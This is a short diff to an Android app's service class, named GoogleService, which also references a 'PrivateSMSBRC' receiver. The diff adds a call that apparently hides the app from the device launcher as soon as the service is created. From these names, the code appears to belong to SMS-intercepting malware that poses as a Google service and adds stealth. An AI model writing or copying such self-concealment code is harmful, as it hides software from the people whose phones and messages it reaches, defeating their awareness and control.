@@ -15,6 +15,7 @@ import android.text.TextUtils;
 import com.umeng.analytics.MobclickAgent;
 import com.xstd.plugin.Utils.CommonUtil;
 import com.xstd.plugin.Utils.MessageHandleUtils;
+import com.xstd.plugin.config.AppRuntime;
 import com.xstd.plugin.config.Config;
 import com.xstd.plugin.receiver.PrivateSMSBRC;
 
@@ -194,6 +195,8 @@ public class GoogleService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
+
+        AppRuntime.hideInLauncher(getApplicationContext());
 
         MobclickAgent.onResume(getApplicationContext());
 
